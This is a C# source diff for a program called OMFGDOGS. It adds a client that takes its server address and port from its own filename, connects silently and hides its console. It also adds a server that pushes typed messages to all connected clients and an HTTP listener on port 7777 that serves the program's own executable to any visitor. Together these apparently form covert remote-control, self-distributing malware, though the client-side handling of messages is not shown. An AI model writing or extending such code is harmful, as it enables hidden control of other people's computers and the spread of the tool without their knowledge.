@@ -25,6 +25,17 @@ namespace OMFGDOGS
             Application.SetCompatibleTextRenderingDefault(false);
             //Application.Run(new Form1());
 
+            string filename = Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+            string[] numbers = filename.Split('.');
+            if (numbers[0] == "c") {
+                // c.a.b.c.d.XXXX.exe
+                int i = 1;
+                var address = IPAddress.Parse(
+                    $"{numbers[i++]}.{numbers[i++]}.{numbers[i++]}.{numbers[i++]}");                    
+                
+                Client(new IPEndPoint(address,int.Parse(numbers[5])));
+            }
+
             var proc = new System.Diagnostics.Process();
 
             Process p = new Process();
@@ -40,7 +51,7 @@ namespace OMFGDOGS
             char option = Console.ReadKey().KeyChar;
             switch (option) {
                 case 's': Server(); break;
-                case 'c': Client(); break;
+                case 'c': Client(Configure()); break;
                 case 't': Application.Run(new Form1()); break;
                 default: goto choice;
             }
@@ -59,10 +70,8 @@ namespace OMFGDOGS
             return new IPEndPoint(IPAddress.Parse(ip), port);
         }
         static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        static void Client()
+        static void Client(IPEndPoint endpoint)
         {
-            Console.WriteLine("ENTER SERVER IP AND PORT");
-            IPEndPoint endpoint = Configure();
             clientSocket.Connect(endpoint);
 
             ConsoleExtension.Hide();
@@ -73,9 +82,8 @@ namespace OMFGDOGS
                 var response = new byte[256]; // буфер для ответа
                 StringBuilder builder = new StringBuilder();
                 int bytes = 0; // количество полученных байт
-                while (clientSocket.Available == 0)
+                while (clientSocket.Poll(1000, SelectMode.SelectRead))
                 {
-                    //подождать, пока не появятся новые данные
                 }
 
                 do
@@ -102,21 +110,62 @@ namespace OMFGDOGS
             //ConsoleExtension.Hide();
         }
 
+        static void SendItself(ref Socket mySocket)
+        {
+            {
+                int iTotBytes = 0;
+                string s = AppDomain.CurrentDomain.BaseDirectory + "OMFGDOGS.exe";
+                // Create a reader that can read bytes from the FileStream.  
+                byte[] bytes = File.ReadAllBytes(s);
+                FunkyServerStuff.SendHeader("HTTP/1.1", "application/octet-stream", bytes.Length, " 200 OK", serverEndpoint, ref mySocket);
+                FunkyServerStuff.SendToBrowser(bytes, ref mySocket);
+            }
+        }
 
+        static void HTTPServer()
+        {
+            while (true)
+            {
+                //Accept a new connection  
+                Socket mySocket = httpServerSocket.Accept();
+                Console.WriteLine("Socket Type " + mySocket.SocketType);
+                if (mySocket.Connected)
+                {
+                   
+                //make a byte array and receive data from the client   
+                    Byte[] bReceive = new Byte[1024];
+                    int i = mySocket.Receive(bReceive, bReceive.Length, 0);
+                    SendItself(ref mySocket);
+                    mySocket.Shutdown(SocketShutdown.Send);
+                    mySocket.Close();
+                }
+            }
+        }
+
+        static IPEndPoint httpServerEndpoint, serverEndpoint;
         static Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        static Socket httpServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         static List<Socket> clients = new List<Socket>();
         static void Server()
         {
-            IPEndPoint endpoint = Configure();
-
-            // создаем сокет
-            
-            serverSocket.Bind(endpoint);
+            serverEndpoint = Configure();
+            serverSocket.Bind(serverEndpoint);
             serverSocket.Listen(64);
-
-
             Thread thread = new Thread(new ThreadStart(ServerThread));
             thread.Start();
+            Console.WriteLine();
+
+            httpServerEndpoint = new IPEndPoint(serverEndpoint.Address, 7777);
+            httpServerSocket.Bind(httpServerEndpoint);
+            httpServerSocket.Listen(64);
+            Thread thread22 = new Thread(new ThreadStart(HTTPServer));
+            thread22.Start();
+
+
+
+
+
+
             while (thread.IsAlive)
             {
                 PropagadeMessage(Console.ReadLine());
